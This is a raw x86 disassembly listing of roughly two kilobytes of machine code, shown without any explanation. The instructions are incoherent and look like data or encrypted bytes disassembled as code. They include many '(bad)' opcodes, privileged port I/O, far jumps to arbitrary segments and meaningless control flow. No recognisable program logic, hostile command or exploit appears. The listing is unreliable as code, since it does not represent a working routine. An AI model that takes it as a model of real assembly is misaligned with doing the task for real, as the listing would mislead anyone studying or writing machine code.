  41ca0d:	sbb    eax,0xe655984
  41ca12:	cmp    eax,0x5f87e5b6
  41ca17:	arpl   WORD PTR [edx+esi*2],si
  41ca1a:	jecxz  0x41c9b4
  41ca1c:	and    ecx,edi
  41ca1e:	push   es
  41ca1f:	or     al,0x5
  41ca21:	push   eax
  41ca22:	mov    al,ds:0x103ce574
  41ca27:	jb     0x41c9e6
  41ca29:	cdq    
  41ca2a:	mov    WORD PTR [ebp-0x3f6999da],cs
  41ca30:	jg     0x41ca71
  41ca32:	les    ebx,FWORD PTR [ebp+0x680861aa]
  41ca38:	mov    ds:0x2609b7c7,eax
  41ca3d:	ror    edi,0xaf
  41ca40:	stc    
  41ca41:	and    BYTE PTR [edi-0x313c8e6b],ch
  41ca47:	mov    ebx,0xe5f0ce66
  41ca4c:	div    DWORD PTR [ecx+esi*4-0x30]
  41ca50:	fld    TBYTE PTR [esi]
  41ca52:	mov    ds:0xd96ac8bf,al
  41ca57:	jp     0x41cac5
  41ca59:	ss icebp 
  41ca5b:	nop
  41ca5c:	push   edi
  41ca5d:	xchg   ebp,eax
  41ca5e:	push   ecx
  41ca5f:	jns    0x41c9e1
  41ca61:	das    
  41ca62:	repnz sbb al,0xb4
  41ca65:	mov    edx,ebp
  41ca67:	cmc    
  41ca68:	repz test DWORD PTR [edi],0xe0bdea83
  41ca6f:	nop
  41ca70:	rol    DWORD PTR [esi-0x2227cfd5],1
  41ca76:	bound  esp,QWORD PTR [eax]
  41ca78:	jge    0x41cab0
  41ca7a:	out    0x2e,eax
  41ca7c:	cmp    eax,0xa651f745
  41ca81:	or     ah,BYTE PTR [ecx+0x34]
  41ca84:	mov    ebx,0x9c21d278
  41ca89:	push   eax
  41ca8a:	sbb    eax,DWORD PTR [edx]
  41ca8c:	xor    BYTE PTR [edx],bh
  41ca8e:	(bad)  
  41ca8f:	mov    dl,0xbe
  41ca91:	stos   BYTE PTR es:[edi],al
  41ca92:	and    al,0x9
  41ca94:	jge    0x41ca37
  41ca96:	nop
  41ca97:	lock xchg edi,eax
  41ca99:	push   cs
  41ca9a:	hlt    
  41ca9b:	leave  
  41ca9c:	cwde   
  41ca9d:	mov    ebp,0xa6617716
  41caa2:	bound  ebx,QWORD PTR [ecx]
  41caa4:	mov    ebx,0x4ecd92da
  41caa9:	jge    0x41cafb
  41caab:	fs xchg ebp,eax
  41caad:	mov    edx,0x3ddeb57e
  41cab2:	adc    esi,esi
  41cab4:	push   0x6ca7b9c4
  41cab9:	cmp    DWORD PTR [ecx],esp
  41cabb:	sahf   
  41cabc:	inc    edi
  41cabd:	lods   al,BYTE PTR ds:[esi]
  41cabe:	lods   al,BYTE PTR ds:[esi]
  41cabf:	pop    esi
  41cac0:	sbb    BYTE PTR ds:0x441b5b81,dh
  41cac6:	in     eax,0x33
  41cac8:	sub    eax,0x2b4aa6ab
  41cacd:	in     eax,dx
  41cace:	mov    DWORD PTR [esi-0x69],ebx
  41cad1:	mov    edx,0xaf516c06
  41cad6:	ret    
  41cad7:	test   al,0x15
  41cad9:	mov    BYTE PTR [ebx+0x35],dh
  41cadc:	ret    
  41cadd:	xchg   ebx,eax
  41cade:	ja     0x41cb34
  41cae0:	push   esi
  41cae1:	scas   eax,DWORD PTR es:[edi]
  41cae2:	repnz mov cl,0x17
  41cae5:	adc    ebx,ebx
  41cae7:	and    DWORD PTR [esi-0x2],0x11
  41caeb:	push   ebp
  41caec:	out    dx,eax
  41caed:	in     al,dx
  41caee:	inc    ebp
  41caef:	test   DWORD PTR [ebp+0x4a],ebp
  41caf2:	mov    cl,0xf9
  41caf4:	xchg   esp,eax
  41caf5:	add    BYTE PTR [ecx],bh
  41caf7:	lods   al,BYTE PTR ds:[esi]
  41caf8:	ins    DWORD PTR es:[edi],dx
  41caf9:	or     ebx,DWORD PTR [ebx-0x2e2b5b83]
  41caff:	or     al,ch
  41cb01:	in     eax,0x3
  41cb03:	fst    DWORD PTR [eax+0x5e]
  41cb06:	ret    0x1fac
  41cb09:	std    
  41cb0a:	call   0xb816ad75
  41cb0f:	inc    esp
  41cb10:	fxch   st(4)
  41cb12:	cmp    esi,edi
  41cb14:	xor    DWORD PTR [ebx],ebx
  41cb16:	dec    esi
  41cb17:	(bad)
  41cb1b:	loopne 0x41cb5c
  41cb1d:	lds    ebp,FWORD PTR [edi]
  41cb1f:	aam    0x47
  41cb21:	inc    edx
  41cb22:	call   0x2e3fe81
  41cb27:	clc    
  41cb28:	out    0xbd,al
  41cb2a:	mov    cl,0xd0
  41cb2c:	lock mov ds:0x3300c99a,eax
  41cb32:	sbb    bh,BYTE PTR [edi-0x22]
  41cb35:	(bad)  
  41cb37:	mov    ebp,0xfbf4a735
  41cb3c:	aad    0x8f
  41cb3e:	hlt    
  41cb3f:	jg     0x41cb81
  41cb41:	mov    ch,0x3b
  41cb43:	int    0xae
  41cb45:	cmc    
  41cb46:	cwde   
  41cb47:	sbb    BYTE PTR [edx-0x6a5ab96],ch
  41cb4d:	pop    esi
  41cb4e:	pop    ds
  41cb4f:	push   ss
  41cb50:	mov    ebx,0x95b81f80
  41cb55:	xchg   esp,eax
  41cb56:	mov    ebp,DWORD PTR [esi]
  41cb58:	push   0x48
  41cb5a:	jne    0x41caee
  41cb5c:	aaa    
  41cb5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb5f:	cmc    
  41cb60:	push   0x71e9c025
  41cb65:	into   
  41cb66:	cmp    esp,DWORD PTR ds:0xc139d921
  41cb6c:	test   eax,0xca76ac87
  41cb72:	scas   al,BYTE PTR es:[edi]
  41cb73:	rcl    BYTE PTR [edi],1
  41cb75:	push   ecx
  41cb76:	fst    QWORD PTR [eax-0x4c]
  41cb79:	jnp    0x41cb93
  41cb7b:	sbb    al,0x79
  41cb7d:	in     eax,dx
  41cb7e:	inc    esp
  41cb7f:	mov    ds:0x1bd4384a,eax
  41cb84:	sub    DWORD PTR [esi-0x51],esi
  41cb87:	push   edi
  41cb88:	xor    al,0xd7
  41cb8a:	idiv   ebp
  41cb8c:	mov    edx,0x9cb9cac9
  41cb91:	aas    
  41cb92:	xchg   ebp,eax
  41cb93:	mov    al,ds:0x2c79c07c
  41cb98:	adc    eax,0xc30e19d6
  41cb9d:	jmp    0xc185:0xcf7a6741
  41cba4:	mov    ds:0x65ea4af7,eax
  41cba9:	andnps xmm7,XMMWORD PTR [edx-0x7a]
  41cbad:	adc    al,0x91
  41cbaf:	popa   
  41cbb0:	daa    
  41cbb1:	pop    edx
  41cbb2:	push   ds
  41cbb3:	call   0x7f090d
  41cbb8:	test   eax,0x190f212f
  41cbbd:	js     0x41cbcb
  41cbbf:	inc    ecx
  41cbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbc1:	std    
  41cbc2:	xor    eax,0x5522ec80
  41cbc7:	mov    cl,0xa1
  41cbc9:	jecxz  0x41cbd8
  41cbcb:	add    al,al
  41cbcd:	sar    BYTE PTR [ecx-0x3119689a],0x9f
  41cbd4:	mov    ds:0x74ba6d2b,al
  41cbd9:	or     esp,ebp
  41cbdb:	fdiv   DWORD PTR [ecx*8+0x155a8c7a]
  41cbe2:	pop    esp
  41cbe3:	inc    esp
  41cbe4:	pop    edi
  41cbe5:	dec    ebp
  41cbe6:	xor    al,0xbe
  41cbe8:	call   FWORD PTR [edx]
  41cbea:	div    DWORD PTR [ecx+0x6385bb34]
  41cbf0:	retf   
  41cbf1:	inc    ebx
  41cbf2:	aas    
  41cbf3:	popa   
  41cbf4:	xchg   ebp,eax
  41cbf5:	into   
  41cbf6:	mov    al,dh
  41cbf8:	push   cs
  41cbf9:	push   edx
  41cbfa:	icebp  
  41cbfb:	jmp    0x396c:0x8a85ad29
  41cc02:	out    0x14,al
  41cc04:	cmp    al,0x1a
  41cc06:	popa   
  41cc07:	es xchg ebp,eax
  41cc09:	test   eax,0xbfb226f7
  41cc0e:	shr    DWORD PTR [esi+ecx*2],0xe6
  41cc12:	jle    0x41cc71
  41cc14:	and    DWORD PTR [ecx-0x1],ecx
  41cc17:	inc    ecx
  41cc18:	test   DWORD PTR [ebp-0x9],esi
  41cc1b:	xor    dl,BYTE PTR [esi+0x299037c1]
  41cc21:	lds    esp,FWORD PTR [ebx+eax*8-0x154c386a]
  41cc28:	scas   eax,DWORD PTR es:[edi]
  41cc29:	out    dx,al
  41cc2a:	xchg   BYTE PTR [esi-0x36],bh
  41cc2d:	push   ss
  41cc2e:	push   ds
  41cc2f:	ja     0x41cc91
  41cc31:	stos   DWORD PTR es:[edi],eax
  41cc32:	mov    ch,BYTE PTR [eax-0x64]
  41cc35:	mov    bl,0x65
  41cc37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc38:	or     ah,BYTE PTR [edx+0x45]
  41cc3b:	dec    esi
  41cc3c:	pop    es
  41cc3d:	ins    DWORD PTR es:[edi],dx
  41cc3e:	mov    ?,WORD PTR ds:0xb542b252
  41cc44:	jle    0x41cbe0
  41cc46:	fadd   DWORD PTR [ebp-0x9]
  41cc49:	add    dl,BYTE PTR [eax+0x44]
  41cc4c:	stos   BYTE PTR es:[edi],al
  41cc4d:	inc    eax
  41cc4e:	push   esi
  41cc4f:	outs   dx,BYTE PTR ds:[esi]
  41cc50:	hlt    
  41cc51:	cmp    eax,0x7c4033d9
  41cc56:	adc    dl,0xe9
  41cc59:	sbb    al,0x58
  41cc5b:	sub    ebx,eax
  41cc5d:	jb     0x41cc55
  41cc5f:	mov    ebp,0x80e0649f
  41cc64:	adc    cl,bl
  41cc66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc67:	es cmc 
  41cc69:	test   eax,0x883c4181
  41cc6e:	fiadd  DWORD PTR [edx-0x48]
  41cc71:	aam    0xbf
  41cc73:	mov    bh,0xaa
  41cc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc76:	mov    BYTE PTR [ebp-0xe],0x30
  41cc7a:	test   eax,0xb612573
  41cc7f:	jnp    0x41cc3b
  41cc81:	je     0x41cc67
  41cc83:	jle    0x41cc63
  41cc85:	and    eax,0xd3d49a48
  41cc8a:	test   al,0x61
  41cc8c:	fxsave [ecx]
  41cc8f:	cld    
  41cc90:	clc    
  41cc91:	data16 ja 0x41cd0a
  41cc94:	jg     0x41cc5b
  41cc96:	cdq    
  41cc97:	sub    BYTE PTR [esi-0x59ad5204],ah
  41cc9d:	cmp    dl,BYTE PTR [ebx+0x71]
  41cca0:	xor    ebx,eax
  41cca2:	dec    eax
  41cca3:	ins    DWORD PTR es:[edi],dx
  41cca4:	ret    
  41cca5:	pop    ebp
  41cca6:	int3   
  41cca7:	sub    edx,DWORD PTR [ecx-0x67f356e9]
  41ccad:	pop    ebx
  41ccae:	scas   al,BYTE PTR es:[edi]
  41ccaf:	or     BYTE PTR [ecx-0x3e],al
  41ccb2:	test   BYTE PTR [ebp-0x38],al
  41ccb5:	or     DWORD PTR [ebp-0x1ddfcdb2],ebx
  41ccbb:	jecxz  0x41ccbc
  41ccbd:	mov    ebx,0xe9ea93d1
  41ccc2:	aas    
  41ccc3:	test   eax,0xce8f3f96
  41ccc8:	fisttp WORD PTR gs:0xe2710808
  41cccf:	addr16 or eax,0xf3bfde4c
  41ccd5:	data16 out 0xcb,al
  41ccd8:	je     0x41ccb0
  41ccda:	or     DWORD PTR [ebp+0x11],0x8d4f570
  41cce1:	nop
  41cce2:	mov    esi,0xa4ee6343
  41cce7:	pop    ds
  41cce8:	xchg   DWORD PTR [edx+edx*1-0x22],edi
  41ccec:	cmp    BYTE PTR [ebp+0x4a],bl
  41ccef:	inc    eax
  41ccf0:	(bad)  
  41ccf1:	push   cs
  41ccf2:	push   es
  41ccf3:	xchg   esi,eax
  41ccf4:	add    eax,0xf5296fe5
  41ccf9:	jg     0x41cce6
  41ccfb:	test   esi,esi
  41ccfd:	adc    eax,0x5b4e112
  41cd02:	push   ebx
  41cd03:	mov    eax,0x2c20966c
  41cd08:	sub    dh,BYTE PTR [eax+ecx*4-0x2cdee9ce]
  41cd0f:	xor    BYTE PTR ss:[esi-0x2c210f0b],bh
  41cd16:	sub    BYTE PTR [ebp-0x12],0x46
  41cd1a:	cmp    eax,0xe623ea3a
  41cd1f:	jecxz  0x41cd2f
  41cd21:	int    0xf8
  41cd23:	and    al,0xcd
  41cd25:	mov    esp,0xe967634c
  41cd2a:	xchg   ecx,eax
  41cd2b:	aaa    
  41cd2c:	pop    esp
  41cd2d:	jge    0x41cd93
  41cd2f:	(bad)  
  41cd30:	fist   WORD PTR [ecx+ecx*4]
  41cd33:	mov    ss:0xf76d0006,al
  41cd39:	nop
  41cd3a:	mov    ah,BYTE PTR [esp+eax*2-0x29bc2e1]
  41cd41:	test   eax,0xf57635d
  41cd46:	mov    al,ch
  41cd48:	and    DWORD PTR [edx],esi
  41cd4a:	dec    ebp
  41cd4b:	outs   dx,BYTE PTR ds:[esi]
  41cd4c:	add    BYTE PTR [edi],dh
  41cd4e:	pop    eax
  41cd4f:	pop    esi
  41cd50:	neg    DWORD PTR [ecx-0x267c1398]
  41cd56:	xchg   esp,eax
  41cd57:	imul   ebp,DWORD PTR [edx+eax*2],0x4d
  41cd5b:	and    al,0xcd
  41cd5d:	cmp    DWORD PTR [ecx+0xa76f9c6],edi
  41cd63:	add    ecx,DWORD PTR [esi]
  41cd65:	popa   
  41cd66:	nop
  41cd67:	hlt    
  41cd68:	sub    bh,BYTE PTR [eax-0x250c479e]
  41cd6e:	pop    ebx
  41cd6f:	xor    al,0x60
  41cd71:	pop    ecx
  41cd72:	fsub   DWORD PTR [ecx]
  41cd74:	sbb    BYTE PTR [ebx-0x455efe8d],al
  41cd7a:	push   edi
  41cd7b:	es push eax
  41cd7d:	aam    0x51
  41cd7f:	imul   edi,DWORD PTR [edi+0x14],0xefae17e1
  41cd86:	leave  
  41cd87:	jmp    0xe18ac5a2
  41cd8c:	int3   
  41cd8d:	adc    DWORD PTR [edx],edx
  41cd8f:	dec    ebx
  41cd90:	jmp    0x41cd9d
  41cd92:	leave  
  41cd93:	xchg   esp,eax
  41cd94:	jno    0x41cdf4
  41cd96:	xor    DWORD PTR [eax-0x7e],edx
  41cd99:	mov    edx,0x13eb321e
  41cd9e:	sub    eax,0x1b675d9c
  41cda3:	sti    
  41cda4:	inc    eax
  41cda5:	mov    ds:0x41534c1,al
  41cdaa:	push   esi
  41cdab:	fistp  WORD PTR [edx]
  41cdad:	scas   eax,DWORD PTR es:[edi]
  41cdae:	push   ss
  41cdaf:	cmp    al,0x5d
  41cdb1:	jg     0x41cdff
  41cdb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdb4:	or     eax,0xbb867c19
  41cdb9:	mov    ds,edx
  41cdbb:	cmc    
  41cdbc:	push   es
  41cdbd:	xor    BYTE PTR [ecx],al
  41cdbf:	data16 je 0x41cdaf
  41cdc2:	outs   dx,BYTE PTR ds:[esi]
  41cdc3:	ror    DWORD PTR [edx-0x5a],cl
  41cdc6:	dec    edx
  41cdc7:	imul   ebx,edi,0x74b9b5f2
  41cdcd:	pusha  
  41cdce:	adc    ch,BYTE PTR [edi]
  41cdd0:	pop    esp
  41cdd1:	lods   eax,DWORD PTR ds:[esi]
  41cdd2:	and    al,0xce
  41cdd4:	mov    eax,0x872b7ac3
  41cdd9:	add    ch,ah
  41cddb:	mov    edx,0xed0252c7
  41cde0:	jno    0x41cde0
  41cde2:	gs (bad) 
  41cde4:	int    0xbf
  41cde6:	mov    WORD PTR [edx+0x20],gs
  41cde9:	(bad)  
  41cdea:	and    BYTE PTR [ebx+edx*1+0x34796eb9],cl
  41cdf1:	xor    al,0x87
  41cdf3:	(bad)  
  41cdf4:	div    DWORD PTR [ecx-0x67b35554]
  41cdfa:	out    0xe8,eax
  41cdfc:	dec    ebp
  41cdfd:	int3   
  41cdfe:	stc    
  41cdff:	into   
  41ce00:	xor    ah,ch
  41ce02:	mov    ebx,0xb7d34705
  41ce07:	jmp    0xc324:0xc12c2232
  41ce0e:	(bad)  
  41ce0f:	pop    ss
  41ce10:	in     eax,dx
  41ce11:	cmp    BYTE PTR [ecx-0x33],ch
  41ce14:	fidivr DWORD PTR [ebp+0x2936b648]
  41ce1a:	sbb    al,0xa6
  41ce1c:	fcom   QWORD PTR [edx]
  41ce1e:	add    al,BYTE PTR [ebx+0x59abe918]
  41ce24:	xor    dl,0x11
  41ce27:	popf   
  41ce28:	jmp    0xb0a53cde
  41ce2d:	mov    esp,DWORD PTR [ecx+edx*1]
  41ce30:	jecxz  0x41ce7e
  41ce32:	fidiv  DWORD PTR [ebp+0x4c]
  41ce35:	cld    
  41ce36:	lods   al,BYTE PTR ds:[esi]
  41ce37:	sub    DWORD PTR [esi+edx*2-0xf],ecx
  41ce3b:	jne    0x41cea1
  41ce3d:	test   BYTE PTR [eax],ah
  41ce3f:	pop    edi
  41ce40:	fsubr  DWORD PTR fs:[esi+0x79]
  41ce44:	xor    ch,BYTE PTR [edx+0x75]
  41ce47:	lea    eax,[esi-0x1d75b882]
  41ce4d:	cmp    ch,BYTE PTR [ebp-0x3a6f9bff]
  41ce53:	ins    BYTE PTR es:[edi],dx
  41ce54:	mov    dl,0xad
  41ce56:	mov    DWORD PTR [esi],esi
  41ce58:	ja     0x41ce5c
  41ce5a:	loopne 0x41cecc
  41ce5c:	push   0x63f143a8
  41ce61:	add    ecx,ebp
  41ce63:	inc    ebx
  41ce64:	or     al,0x38
  41ce66:	cmp    WORD PTR [ecx-0x2c],bp
  41ce6a:	lock add bl,bl
  41ce6d:	aaa    
  41ce6e:	aas    
  41ce6f:	or     eax,0x25f052c1
  41ce74:	add    al,0xd9
  41ce76:	lds    ecx,FWORD PTR [ecx+0x3e69f8d4]
  41ce7c:	bound  edx,QWORD PTR [edi+0x1feed044]
  41ce82:	inc    BYTE PTR gs:[ebp-0x651544df]
  41ce89:	jecxz  0x41cf04
  41ce8b:	add    al,0xdc
  41ce8d:	in     eax,dx
  41ce8e:	dec    ecx
  41ce8f:	mov    cl,0xa5
  41ce91:	jae    0x41ce29
  41ce93:	shl    BYTE PTR [ecx+0x6f1a706],0x1b
  41ce9a:	jb     0x41cedb
  41ce9c:	(bad)  [esi+eiz*4]
  41ce9f:	sbb    DWORD PTR [esi-0x53d0f7d3],eax
  41cea5:	(bad)  
  41cea6:	repnz inc ecx
  41cea8:	retf   
  41cea9:	mov    ah,0x56
  41ceab:	or     ah,BYTE PTR ss:[esi-0x23f4008c]
  41ceb2:	sub    eax,DWORD PTR [edi]
  41ceb4:	test   DWORD PTR [edi],eax
  41ceb6:	ror    DWORD PTR [edi-0x1],0xc
  41ceba:	out    0xad,al
  41cebc:	das    
  41cebd:	ret    
  41cebe:	jbe    0x41cf2c
  41cec0:	clc    
  41cec1:	sti    
  41cec2:	mov    dl,0xce
  41cec4:	and    eax,0x849b9863
  41cec9:	cmp    al,0x25
  41cecb:	sbb    eax,0xe1346206
  41ced0:	xchg   esp,eax
  41ced1:	mov    edi,0xb974e9ad
  41ced6:	(bad)  
  41ced7:	mov    esi,0x445b1091
  41cedc:	cmp    al,0x1d
  41cede:	scas   al,BYTE PTR es:[edi]
  41cedf:	jo     0x41ce8f
  41cee1:	pop    esp
  41cee2:	or     al,BYTE PTR [esi+0x2b]
  41cee5:	push   ebx
  41cee6:	scas   al,BYTE PTR es:[edi]
  41cee7:	mov    al,ds:0xcd949201
  41ceec:	call   0x4cae9ddf
  41cef1:	fs dec edx
  41cef3:	mov    bh,0x93
  41cef5:	mov    edx,0x42f25af3
  41cefa:	aas    
  41cefb:	mov    edi,ebx
  41cefd:	push   esp
  41cefe:	stc    
  41ceff:	inc    esi
  41cf00:	fs adc esp,esp
  41cf03:	inc    esp
  41cf04:	mov    ds:0x3318c1e9,al
  41cf09:	sbb    eax,0xec0dd4ab
  41cf0e:	push   ecx
  41cf0f:	pushf  
  41cf10:	in     al,0x48
  41cf12:	pop    ebx
  41cf13:	cmc    
  41cf14:	out    0x54,al
  41cf16:	jmp    DWORD PTR [ebx]
  41cf18:	retf   0x6c4d
  41cf1b:	sbb    esp,DWORD PTR [ebp+0xf]
  41cf1e:	and    dl,dl
  41cf20:	adc    bl,BYTE PTR [edi-0x50]
  41cf23:	lea    esi,[eax-0x60]
  41cf26:	add    esp,DWORD PTR ds:0xf467b2e8
  41cf2c:	xor    ebx,ebp
  41cf2e:	add    al,0x75
  41cf30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf31:	jns    0x41cf4b
  41cf33:	test   bh,0x4c
  41cf36:	stos   BYTE PTR es:[edi],al
  41cf37:	mov    dl,0x5
  41cf39:	ins    BYTE PTR es:[edi],dx
  41cf3a:	mov    ss,WORD PTR [edi-0x5110b0f3]
  41cf40:	(bad)  
  41cf41:	dec    ebx
  41cf42:	xchg   edx,eax
  41cf43:	stc    
  41cf44:	call   0x6690abab
  41cf49:	and    al,0xdc
  41cf4b:	sbb    BYTE PTR [esi],cl
  41cf4d:	adc    BYTE PTR [ecx],0x1
  41cf50:	add    al,0x2a
  41cf52:	xor    eax,0x678dfe50
  41cf57:	adc    dl,BYTE PTR [ecx]
  41cf59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf5a:	xor    eax,esi
  41cf5c:	stos   DWORD PTR es:[edi],eax
  41cf5d:	dec    esi
  41cf5e:	int3   
  41cf5f:	fs xchg dh,al
  41cf62:	js     0x41cf9c
  41cf64:	out    0xef,eax
  41cf66:	cmp    eax,0x47c55696
  41cf6b:	aam    0x8b
  41cf6d:	popf   
  41cf6e:	ins    BYTE PTR es:[edi],dx
  41cf6f:	mov    bl,0xe7
  41cf71:	jo     0x41cfdf
  41cf73:	popf   
  41cf74:	xor    bh,BYTE PTR [ebx+0x436129b2]
  41cf7a:	fbstp  TBYTE PTR [eax-0x475e429e]
  41cf80:	ret    0xe0b4
  41cf83:	dec    ecx
  41cf84:	ja     0x41cf24
  41cf86:	enter  0x9ebf,0x1f
  41cf8a:	fadd   QWORD PTR [ebp+0x77]
  41cf8d:	scas   al,BYTE PTR es:[edi]
  41cf8e:	jno    0x41cfb2
  41cf90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf91:	leave  
  41cf92:	cmp    DWORD PTR [edi+0x1d],ebx
  41cf95:	cmp    cl,ah
  41cf97:	cmp    dh,bl
  41cf99:	je     0x41d016
  41cf9b:	mov    ebp,0x3024c5e4
  41cfa0:	mov    ds:0x99f4fd85,eax
  41cfa5:	aaa    
  41cfa6:	xor    DWORD PTR [ecx],esi
  41cfa8:	push   0x8041b4c6
  41cfad:	cdq    
  41cfae:	inc    ebx
  41cfaf:	stos   DWORD PTR es:[edi],eax
  41cfb0:	pusha  
  41cfb1:	mov    eax,0x3259c8a0
  41cfb6:	cmp    eax,0xad11da62
  41cfbb:	add    BYTE PTR [ebp-0x49dbc1f8],ah
  41cfc1:	inc    esp
  41cfc2:	xchg   ebx,eax
  41cfc3:	test   al,0x21
  41cfc5:	mov    dh,BYTE PTR es:[ecx+0x7e]
  41cfc9:	adc    al,0xd4
  41cfcb:	inc    esi
  41cfcc:	add    dl,BYTE PTR [ecx-0x459dbe21]
  41cfd2:	jno    0x41d014
  41cfd4:	xchg   esi,eax
  41cfd5:	sahf   
  41cfd6:	xchg   edx,eax
  41cfd7:	or     al,0x49
  41cfd9:	aas    
  41cfda:	and    al,0x8b
  41cfdc:	add    bl,dh
  41cfde:	or     esi,edx
  41cfe0:	(bad)  
  41cfe1:	out    dx,eax
  41cfe2:	or     eax,esi
  41cfe4:	out    0x59,eax
  41cfe6:	xor    al,0x79
  41cfe8:	adc    DWORD PTR [ecx-0x35],ebp
  41cfeb:	repnz push 0xd65f09de
  41cff1:	in     eax,0x60
  41cff3:	lods   eax,DWORD PTR ds:[esi]
  41cff4:	inc    ebp
  41cff5:	jmp    0x41cfd3
  41cff7:	std    
  41cff8:	in     al,dx
  41cff9:	(bad)  
  41cffb:	bound  ecx,QWORD PTR ds:0xcd92e8c3
  41d001:	jmp    0xc884007
  41d006:	sub    ch,dl
  41d008:	sbb    bl,BYTE PTR [esi-0x52af8af5]
  41d00e:	mov    eax,DWORD PTR [ebx]
  41d010:	mov    esp,0x4549aa7c
  41d015:	arpl   WORD PTR [edx],si
  41d017:	ror    DWORD PTR [ebx+ecx*2-0x4717df34],1
  41d01e:	xchg   esi,eax
  41d01f:	popa   
  41d020:	xor    esp,edi
  41d022:	dec    ebx
  41d023:	push   esp
  41d024:	sbb    al,0x93
  41d026:	pop    esi
  41d027:	dec    ecx
  41d028:	cmp    eax,edx
  41d02a:	addr16 inc ebx
  41d02c:	int    0xfd
  41d02e:	push   es
  41d02f:	dec    edi
  41d030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d031:	leave  
  41d032:	jg     0x41cfe7
  41d034:	jle    0x41d054
  41d036:	gs (bad) 
  41d038:	jo     0x41d03a
  41d03a:	loopne 0x41cfc6
  41d03c:	sub    bh,BYTE PTR [esi+edi*8+0x384b37c4]
  41d043:	nop
  41d044:	push   ds
  41d045:	ins    BYTE PTR es:[edi],dx
  41d046:	inc    ebp
  41d047:	add    al,0xc6
  41d049:	cmp    edi,esi
  41d04b:	aam    0x54
  41d04d:	shl    ecx,cl
  41d04f:	int    0xff
  41d051:	add    DWORD PTR [ecx],ebp
  41d053:	in     eax,dx
  41d054:	mov    dh,0xfe
  41d056:	pop    es
  41d057:	inc    esi
  41d058:	xchg   esp,eax
  41d059:	sbb    eax,0x7619b5ed
  41d05e:	test   al,0x76
  41d060:	add    BYTE PTR [ecx-0x7b190347],ch
  41d066:	jmp    0x6d56446e
  41d06b:	push   edx
  41d06c:	ret    0xb6df
  41d06f:	sahf   
  41d070:	xchg   ecx,eax
  41d071:	clc    
  41d072:	or     edi,DWORD PTR fs:[ebx]
  41d075:	mov    eax,0xd3afe133
  41d07a:	ins    BYTE PTR es:[edi],dx
  41d07b:	inc    ebp
  41d07c:	xlat   BYTE PTR ds:[ebx]
  41d07d:	into   
  41d07e:	nop
  41d07f:	pop    esi
  41d080:	imul   eax,DWORD PTR ds:0xf3ef5ca2,0x35
  41d087:	ins    BYTE PTR es:[edi],dx
  41d088:	mov    ds:0xd78f7eeb,al
  41d08d:	ficomp WORD PTR [esi+0x34490de7]
  41d093:	(bad)  
  41d094:	mov    ss:0x3c2801b6,eax
  41d09a:	xor    eax,0x96149231
  41d09f:	je     0x41d085
  41d0a1:	stos   BYTE PTR es:[edi],al
  41d0a2:	aaa    
  41d0a3:	icebp  
  41d0a4:	xchg   BYTE PTR [ebp+0x53],dh
  41d0a7:	jmp    0x41d095
  41d0a9:	add    dl,BYTE PTR [edi+0x7793f394]
  41d0af:	neg    BYTE PTR [ebp+ecx*4+0xc5ab1b0]
  41d0b6:	dec    ebx
  41d0b7:	dec    ebp
  41d0b8:	mov    ?,WORD PTR [esi]
  41d0ba:	mov    DWORD PTR [ecx+edx*2],edi
  41d0bd:	loopne 0x41d105
  41d0bf:	jmp    0xb20c:0xe1f871af
  41d0c6:	pop    edx
  41d0c7:	cs jb  0x41d101
  41d0ca:	mov    bh,BYTE PTR ds:0x80feaab4
  41d0d0:	xchg   ebx,eax
  41d0d1:	push   ecx
  41d0d2:	xchg   ecx,eax
  41d0d3:	dec    edi
  41d0d4:	jmp    0x41d066
  41d0d6:	pop    edx
  41d0d7:	dec    esi
  41d0d8:	sub    ebp,DWORD PTR [edx]
  41d0da:	mov    al,0x71
  41d0dc:	fidiv  WORD PTR [esi-0x5da5213]
  41d0e2:	dec    ebx
  41d0e3:	jle    0x41d0dc
  41d0e5:	or     eax,0x574d4497
  41d0ea:	adc    al,BYTE PTR [ebx+0xe]
  41d0ed:	call   0x59b17e94
  41d0f2:	lds    edi,FWORD PTR [ebx+0x8ade05d]
  41d0f8:	retf   0x8c13
  41d0fb:	cmpxchg BYTE PTR [edi],ch
  41d0fe:	mov    ds:0x2bb0a811,eax
  41d103:	xchg   ebp,eax
  41d104:	or     DWORD PTR [edx+0x2031025f],esp
  41d10a:	sar    DWORD PTR [esi+0x10b5a5b2],0x45
  41d111:	arpl   WORD PTR [ebp+ebx*8+0x413b6dff],dx
  41d118:	xor    DWORD PTR ds:0xf038f3f9,ebp
  41d11e:	inc    eax
  41d11f:	mov    ebp,0xd5862545
  41d124:	pop    ds
  41d125:	into   
  41d126:	cmp    cl,BYTE PTR ds:0x9217299e
  41d12c:	push   ecx
  41d12d:	push   es
  41d12e:	mov    ebp,0xac9e15ac
  41d133:	and    eax,0xbe8ac3f4
  41d138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d139:	sbb    eax,0xeffb03de
  41d13e:	jle    0x41d190
  41d140:	sub    bl,al
  41d142:	call   0x71f2:0x50f20d2d
  41d149:	dec    edx
  41d14a:	lahf   
  41d14b:	mov    al,es:0x54647a3e
  41d151:	add    ch,cl
  41d153:	pop    es
  41d154:	lds    ecx,FWORD PTR [edi+edi*8-0x21dd8e79]
  41d15b:	retf   
  41d15c:	add    eax,0xd35c24cd
  41d161:	and    eax,0x38def54a
  41d166:	mov    dl,0xe1
  41d168:	clc    
  41d169:	add    dl,BYTE PTR [ecx+edi*1+0x7b08bec4]
  41d170:	mov    ds:0xa9f47aa7,eax
  41d175:	pop    eax
  41d176:	fld    TBYTE PTR [edx]
  41d178:	sub    WORD PTR [ebp-0x50dfe682],sp
  41d17f:	mov    cl,0x59
  41d181:	out    0x86,eax
  41d183:	inc    ebx
  41d184:	lea    ecx,[ebx+ecx*4+0x55]
  41d188:	sub    edx,DWORD PTR [eax+0x5949d3c8]
  41d18e:	pusha  
  41d18f:	push   ebp
